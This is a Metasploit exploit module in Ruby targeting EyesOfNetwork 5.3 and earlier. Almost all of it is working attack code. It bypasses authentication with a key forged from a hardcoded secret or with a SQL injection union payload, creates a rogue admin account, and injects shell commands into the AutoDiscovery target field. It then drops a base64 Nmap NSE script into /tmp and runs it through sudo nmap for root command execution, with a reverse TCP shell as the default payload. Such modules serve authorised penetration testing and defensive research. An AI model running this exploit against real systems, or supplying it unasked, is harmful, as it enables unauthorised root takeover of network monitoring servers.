# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;EyesOfNetwork AutoDiscovery Target Command Execution&#039;,
      &#039;Description&#039;     => %q{
        This module exploits multiple vulnerabilities in EyesOfNetwork version 5.3
        and prior in order to execute arbitrary commands as root.

        This module takes advantage of a command injection vulnerability in the
        `target` parameter of the AutoDiscovery functionality within the EON web
        interface in order to write an Nmap NSE script containing the payload to
        disk. It then starts an Nmap scan to activate the payload. This results in
        privilege escalation because the`apache` user can execute Nmap as root.

        Valid credentials for a user with administrative privileges are required.
        However, this module can bypass authentication via two methods, i.e. by
        generating an API access token based on a hardcoded key, and via SQLI.
        This module has been successfully tested on EyesOfNetwork 5.3 with API
        version 2.4.2.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Clément Billac&#039;, # @h4knet - Discovery and exploit
          &#039;bcoles&#039;,         # Metasploit
          &#039;Erik Wynter&#039;     # @wyntererik - Metasploit
        ],
      &#039;References&#039;      =>
        [
          [&#039;CVE&#039;, &#039;2020-8654&#039;], # authenticated rce
          [&#039;CVE&#039;, &#039;2020-8655&#039;], # nmap privesc
          [&#039;CVE&#039;, &#039;2020-8656&#039;], # sqli auth bypass
          [&#039;CVE&#039;, &#039;2020-8657&#039;], # hardcoded API key
          [&#039;EDB&#039;, &#039;48025&#039;]
        ],
      &#039;Platform&#039;        => %w[unix linux],
      &#039;Arch&#039;            => ARCH_CMD,
      &#039;Targets&#039;         => [[&#039;Auto&#039;, { }]],
      &#039;Privileged&#039;      => true,
      &#039;DisclosureDate&#039;  => &#039;2020-02-06&#039;,
      &#039;DefaultOptions&#039;  => {
        &#039;RPORT&#039; => 443,
        &#039;SSL&#039;     => true, #HTTPS is required for the module to work
        &#039;PAYLOAD&#039; => &#039;generic/shell_reverse_tcp&#039;
        },
      &#039;DefaultTarget&#039;   => 0))
    register_options [
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path to EyesOfNetwork&#039;, &#039;/&#039;]),
      OptString.new(&#039;SERVER_ADDR&#039;, [true, &#039;EyesOfNetwork server IP address (if different from RHOST)&#039;, &#039;&#039;]),
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;,  [false, &#039;Override check result&#039;, false])
    ]
  end

  def nmap_path
    &#039;/usr/bin/nmap&#039;
  end

  def server_addr
    datastore[&#039;SERVER_ADDR&#039;].blank? ? rhost : datastore[&#039;SERVER_ADDR&#039;]
  end

  def check
    vprint_status("Running check")
    res = send_request_cgi &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/eonapi/getApiKey&#039;)

    unless res
      return CheckCode::Unknown(&#039;Connection failed&#039;)
    end

    unless res.code == 401 && res.body.include?(&#039;api_version&#039;)
      return CheckCode::Safe(&#039;Target is not an EyesOfNetwork application.&#039;)
    end

    version = res.get_json_document()[&#039;api_version&#039;] rescue &#039;&#039;

    if version.to_s.eql? &#039;&#039;
      return CheckCode::Detected(&#039;Could not determine EyesOfNetwork version.&#039;)
    end

    version = Gem::Version.new version

    unless version <= Gem::Version.new(&#039;2.4.2&#039;)
      return CheckCode::Safe("Target is EyesOfNetwork with API version #{version}.")
    end

    CheckCode::Appears("Target is EyesOfNetwork with API version #{version}.")
  end

  def generate_api_key
    default_key = "€On@piK3Y"
    default_user_id = 1
    key = Digest::MD5.hexdigest(default_key + default_user_id.to_s)
    Digest::SHA256.hexdigest(key + server_addr)
  end

  def sqli_to_api_key
    # Attempt to obtain the admin API key via SQL injection, using a fake password and its md5 encrypted hash
    fake_pass = Rex::Text::rand_text_alpha(10)
    fake_pass_md5 = Digest::MD5.hexdigest("#{fake_pass}")
    user_sqli = "&#039; union select 1,&#039;admin&#039;,&#039;#{fake_pass_md5}&#039;,0,0,1,1,8 or &#039;"
    api_res = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri.path, "/eonapi/getApiKey"),
      &#039;method&#039;    => &#039;GET&#039;,
       &#039;vars_get&#039; => {
        &#039;username&#039;   => user_sqli,
        &#039;password&#039;   => fake_pass
      }
    })

    unless api_res
      print_error(&#039;Connection failed.&#039;)
      return
    end

    unless api_res.code == 200 && api_res.get_json_document.include?(&#039;EONAPI_KEY&#039;)
      print_error("SQL injection to obtain API key failed")
      return
    end

    api_res.get_json_document()[&#039;EONAPI_KEY&#039;]
  end

  def create_eon_user(user, password)
    vprint_status("Creating user #{user} ...")

    vars_post = {
      user_name:  user,
      user_group: "admins",
      user_password: password
    }
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;/eonapi/createEonUser&#039;),
      &#039;ctype&#039;    => &#039;application/json&#039;,
      &#039;vars_get&#039; => {
        &#039;apiKey&#039;   => @api_key,
        &#039;username&#039; => @api_user
      },
      &#039;data&#039; => vars_post.to_json
    })

    unless res
      print_warning("Failed to create user: Connection failed.")
      return
    end

    return res
  end

  def verify_api_key(res)
    return false unless res.code == 200

    json_data = res.get_json_document
    json_res = json_data[&#039;result&#039;]
    return false unless json_res && json_res[&#039;description&#039;]
    json_res = json_res[&#039;description&#039;]

    return true if json_res && json_res.include?(&#039;SUCCESS&#039;)

    return false
  end

  def delete_eon_user(user)
    vprint_status "Removing user #{user} ..."

    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;/eonapi/deleteEonUser&#039;),
      &#039;ctype&#039;    => &#039;application/json&#039;,
      &#039;data&#039;     => { user_name: user }.to_json,
      &#039;vars_get&#039; => { apiKey: @api_key, username: @api_user }
    })

    unless res
      print_warning &#039;Removing user #{user} failed: Connection failed&#039;
      return
    end

    res
  end

  def login(user, pass)
    vprint_status "Authenticating as #{user} ..."

    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;login.php&#039;),
      &#039;vars_post&#039; => {
        login: user,
        mdp: pass
      }
    })

    unless res
      fail_with Failure::Unreachable, &#039;Connection failed&#039;
    end

    unless res.code == 200 && res.body.include?(&#039;dashboard_view&#039;)
      fail_with Failure::NoAccess, &#039;Authentication failed&#039;
    end

    print_good "Authenticated as user #{user}"

    @cookie = res.get_cookies

    if @cookie.empty?
      fail_with Failure::UnexpectedReply, &#039;Failed to retrieve cookies&#039;
    end

    res
  end

  def create_autodiscovery_job(cmd)
    vprint_status "Creating AutoDiscovery job: #{cmd}"

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;/lilac/autodiscovery.php&#039;),
      &#039;cookie&#039; => @cookie,
      &#039;vars_post&#039; => {
        &#039;request&#039;          => &#039;autodiscover&#039;,
        &#039;job_name&#039;         => &#039;Internal discovery&#039;,
        &#039;job_description&#039;  => &#039;Internal EON discovery procedure.&#039;,
        &#039;nmap_binary&#039;      => nmap_path,
        &#039;default_template&#039; => &#039;&#039;,
        &#039;target[]&#039;         => cmd
      }
    })

    unless res
      fail_with Failure::Unreachable, &#039;Creating AutoDiscovery job failed: Connection failed&#039;
    end

    unless res.body.include? &#039;Starting...&#039;
      fail_with Failure::Unknown, &#039;Creating AutoDiscovery job failed: Job failed to start&#039;
    end

    res
  end

  def delete_autodiscovery_job(job_id)
    vprint_status "Removing AutoDiscovery job #{job_id} ..."

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;/lilac/autodiscovery.php&#039;),
      &#039;cookie&#039; => @cookie,
      &#039;vars_get&#039; => {
        id: job_id,
        delete: 1
      }
    })

    unless res
      print_warning "Removing AutoDiscovery job #{job_id} failed: Connection failed"
      return
    end
    res
  end

  def execute_command(cmd, opts = {})
    res = create_autodiscovery_job ";#{cmd} #"
    return unless res

    job_id = res.body.scan(/autodiscovery.php\?id=([\d]+)/).flatten.first

    if job_id.empty?
      print_warning &#039;Could not retrieve AutoDiscovery job ID. Manual removal required.&#039;
      return
    end
    delete_autodiscovery_job job_id
  end

  def cleanup
    super
    if @username
      delete_eon_user @username
    end
  end

  def exploit
    unless [CheckCode::Detected, CheckCode::Appears].include? check
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    @api_user = &#039;admin&#039;
    @api_key = generate_api_key
    print_status "Using generated API key: #{@api_key}"

    @username = rand_text_alphanumeric(8..12)
    @password = rand_text_alphanumeric(8..12)

    create_res = create_eon_user @username, @password
    unless verify_api_key(create_res)
      @api_key = sqli_to_api_key
      fail_with Failure::NoAccess, &#039;Failed to obtain valid API key&#039; unless @api_key
      print_status("Using API key obtained via SQL injection: #{@api_key}")
      sqli_verify = create_eon_user @username, @password
      fail_with Failure::NoAccess, &#039;Failed to obtain valid API with sqli&#039; unless verify_api_key(sqli_verify)
    end

    admin_group_id = 1
    login @username, @password
    unless @cookie.include? &#039;group_id=&#039;
      @cookie << "; group_id=#{admin_group_id}"
    end

    nse = Rex::Text.encode_base64("local os=require \"os\" hostrule=function(host) os.execute(\"#{payload.encoded.gsub(/"/, &#039;\"&#039;)}\") end action=function() end")
    nse_path = "/tmp/.#{rand_text_alphanumeric 8..12}"
    cmd = "echo #{nse} | base64 -d > #{nse_path};sudo #{nmap_path} localhost -sn -script #{nse_path};rm #{nse_path}"
    print_status "Sending payload (#{cmd.length} bytes) ..."
    execute_command cmd
  end
end

